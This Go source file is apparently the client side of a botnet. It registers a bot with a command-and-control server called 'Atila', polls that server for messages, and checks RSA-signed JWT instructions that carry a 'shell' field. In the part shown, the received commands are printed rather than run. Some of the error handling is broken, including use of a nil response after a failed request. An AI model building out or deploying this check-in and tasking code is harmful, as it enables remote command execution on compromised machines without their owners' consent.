package main

import (
	"bytes"
	"crypto/rsa"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"

	"github.com/golang-jwt/jwt"
)

type ParsedMessageContnet struct {
	Shell string `json:"shell"` // Shell code.
}

type Message struct {
	Id      string `json:"id"`      // Unique identifier.
	From    string `json:"from"`    // Node which originally issued the message.
	To      string `json:"to"`      // Which node should receive message.
	Subject string `json:"subject"` // Key used for rounting of the content into different code paths.
	Content string `json:"content"` // Base64 encoded data.
	Status  string `json:"status"`  // Message's state.
	ReplyTo string `json:"replyTo"` // Original message ID.
}

// identifyPayload is a structure corresponding to Atila's bot identification endpoint.
type identifyPayload struct {
	Id        string `json:"id"`        // UUID of the bot. (self-generated)
	PublicKey string `json:"publicKey"` // Public key of the bot.
	Status    string `json:"status"`    // Bot's status.
}

// identify makes the bot known to the Atila server. Returns true if identification was successful.
func identify(id string, publicKey *rsa.PublicKey) bool {
	// Bot's identification details which will be stored in the Atila's database.
	details := identifyPayload{
		Id:        id,
		PublicKey: publicKeyToPEM(publicKey),
		Status:    "ALIVE",
	}

	detailsJson, err := json.Marshal(details)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}

	request, err := http.NewRequest("POST", atilaHost+"/v1/clients", bytes.NewBuffer(detailsJson))
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	defer request.Body.Close()

	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err.Error())
		return false
	}
	defer response.Body.Close()

	// Any status code other than 200 is a failure.
	if response.StatusCode != 200 {
		fmt.Println("Identification failed with status code: " + fmt.Sprint(response.StatusCode))
		return false
	}

	return true
}

// inboxReader is a loop of fetching and interpreting messages.
// Returns true if the operation was successful, false if it didn't.
func inboxReader(id string) bool {
	messages := fetchMessages(id)

	for _, message := range messages {
		reply, err := interpretMessage(message)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
		fmt.Println(reply)
	}

	return true
}

// interpretMessage given the message it will generate a reply message.
func interpretMessage(message Message) (Message, error) {
	var reply Message = Message{
		From:    message.To,
		ReplyTo: message.Id,
	}

	if message.Subject != "instruction" {
		return reply, errors.New("unrecognized message subject")
	}

	// Message's content.
	content := ParsedMessageContnet{}

	// Verify the message's content.
	token, err := jwt.Parse(message.Content, func(token *jwt.Token) (interface{}, error) {
		if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
			return nil, errors.New("invalid signing algorithm")
		}
		return trustedPublicKey, nil
	})
	if err != nil {
		return reply, err
	}
	if claims, ok := token.Claims.(jwt.MapClaims); ok && token.Valid {
		if claims["shell"] != nil {
			content.Shell = fmt.Sprint(claims["shell"])
		}
	} else {
		return reply, errors.New("invalid token's signature")
	}

	fmt.Println(content)

	return reply, nil
}

// fetchMessages reaches out to Atila (cnc) and gets the unseen messages.
// Do remember to ack. the message after interpreting it and issue the response.
func fetchMessages(id string) []Message {
	response, err := http.Get(atilaHost + "/v1/messages?clientId=" + id)
	if err != nil {
		fmt.Println(err.Error())
	}
	defer response.Body.Close()

	jsonDecoder := json.NewDecoder(response.Body)
	jsonDecoder.DisallowUnknownFields()

	var messages []Message

	jsonErr := jsonDecoder.Decode(&messages)
	if jsonErr != nil {
		fmt.Println(jsonErr.Error())
	}

	return messages
}
